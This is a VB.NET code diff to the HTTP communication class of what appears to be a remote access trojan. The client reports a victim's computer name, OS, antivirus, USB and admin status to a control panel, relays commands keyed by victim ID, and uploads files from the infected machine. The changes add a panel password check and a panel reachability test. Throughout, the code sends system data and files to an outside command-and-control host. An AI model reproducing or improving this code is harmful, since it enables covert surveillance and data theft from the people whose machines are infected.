@@ -4,11 +4,16 @@ Namespace HTTPSocket
     Public Class HTTP
         Public ID As String
         Public Host As String
+        Public C_Password As String
         Dim Socket As New WebClient
         Public Function Connect()
             Try
-                _GET("connection.php?data=" & ENB(ID & "|BN|" & My.Computer.Name & "|BN|" & My.Computer.Info.OSFullName & "|BN|" & Form1.GetAntiVirus() & "|BN|Online" & "|BN|" & Form1.checkUSB() & "|BN|" & Form1.checkadmin))
-                Return True
+                Dim Resopnse As String = _GET("connection.php?password=" & ENB(C_Password) & "&data=" & ENB(ID & "|BN|" & My.Computer.Name & "|BN|" & My.Computer.Info.OSFullName & "|BN|" & Form1.GetAntiVirus() & "|BN|Online" & "|BN|" & Form1.checkUSB() & "|BN|" & Form1.checkadmin))
+                If Resopnse = "True" Then
+                    Return True
+                Else
+                    Return False
+                End If
             Catch ex As Exception
                 Return False
             End Try
@@ -24,9 +29,8 @@ Namespace HTTPSocket
         End Function
         Public Function _GET(ByVal request As String)
             Try
-                Socket.DownloadString(Host & "/" & request)
-                Return True
-            Catch ex As Exception
+                Return Socket.DownloadString(Host & "/" & request)
+            Catch ex As WebException
                 Return ex.Message
             End Try
         End Function
@@ -57,7 +61,7 @@ Namespace HTTPSocket
             Try
                 Socket.DownloadString(Host & "/" & "receive.php?command=" & ENB(Command) & "&vicID=" & ENB(ID))
                 Return True
-            Catch ex As Exception
+            Catch ex As WebException
                 Return ex.Message
             End Try
         End Function
@@ -65,12 +69,29 @@ Namespace HTTPSocket
             Try
                 Socket.UploadFile(Host & "/upload.php?id=" & ENB(ID), Filepath)
                 Return True
-            Catch ex As Exception
+            Catch ex As WebException
                 Return ex.Message
             End Try
         End Function
-        Public Sub Log(ByVal Type As String, ByVal Message As String)
+        Public Function Log(ByVal Type As String, ByVal Message As String)
             Send("NewLog" & "|BN|" & Type & "|BN|" & Message)
-        End Sub
+            Return True
+        End Function
+        Public Function IsPanel(ByVal PanelURL As String)
+            Dim url As New System.Uri(PanelURL)
+            Dim req As System.Net.WebRequest
+            req = System.Net.WebRequest.Create(url)
+            Dim resp As System.Net.WebResponse
+            Try
+                resp = req.GetResponse()
+                resp.Close()
+                req = Nothing
+                Return True
+            Catch ex As WebException
+                req = Nothing
+                Return False
+            End Try
+            Return ""
+        End Function
     End Class
 End Namespace
